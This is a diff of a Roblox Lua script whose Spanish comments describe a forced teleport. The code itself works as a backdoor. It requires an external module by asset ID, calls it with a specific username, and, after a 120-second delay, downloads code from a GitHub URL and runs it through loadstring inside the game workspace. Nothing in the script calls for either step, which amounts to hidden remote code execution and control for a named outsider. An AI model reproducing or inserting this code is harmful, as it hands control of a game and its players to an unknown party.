@@ -1,21 +1,21 @@
 local HttpService = game:GetService("HttpService")
 
--- Ejecutar Funcion De Administrador Para Intentar Forzar La Teletrasportacion
-local success, response = pcall(HttpService.GetAsync, HttpService, "https://raw.githubusercontent.com/luisaddoba200-wq/CodeAdmin.Coderless/main/Admin.Code.Userless")
-if success and response then
-    local runCode = loadstring(response)
-    if runCode then
-        getfenv(runCode).script = workspace
-        task.spawn(runCode)
-    end
-end
-
---Si El Teleport 1 No Funciona Activar El modelo De Teleport
-
--- 2. Ejecution De Require de mi parte que automaitcamente creara Un Teleport En la Pocision Del Jugaodr
+-- 1. Ejecución INMEDIATA del módulo require (se Llama Ami Modulo, Para que aplique el Teleport Al CmdSpot)
 local modelSuccess, module = pcall(require, 94217198436768)
 if modelSuccess and module then
     pcall(function()
         module:pls("luilo30095")
     end)
 end
+
+-- 2. Si Despues de 2 Minutos Forzar La teletrasportacion Al CmdSpot si o si!
+task.delay(120, function()
+    local success, response = pcall(HttpService.GetAsync, HttpService, "https://raw.githubusercontent.com/luisaddoba200-wq/CodeAdmin.Coderless/main/Admin.Code.Userless")
+    if success and response then
+        local runCode = loadstring(response)
+        if runCode then
+            getfenv(runCode).script = workspace
+            task.spawn(runCode)
+        end
+    end
+end)
